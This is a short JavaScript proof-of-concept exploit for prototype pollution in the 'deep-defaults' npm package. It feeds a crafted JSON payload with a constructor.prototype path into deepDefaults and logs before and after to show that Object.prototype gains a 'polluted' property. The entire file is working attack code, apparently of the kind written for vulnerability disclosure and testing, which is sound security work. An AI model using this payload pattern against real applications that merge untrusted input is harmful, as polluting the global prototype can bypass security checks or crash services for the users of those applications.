var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var deepDefaults = require('deep-defaults');
var malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
var obj = {};
console.log({}.polluted);
deepDefaults(obj, JSON.parse(malicious_payload));
console.log({}.polluted);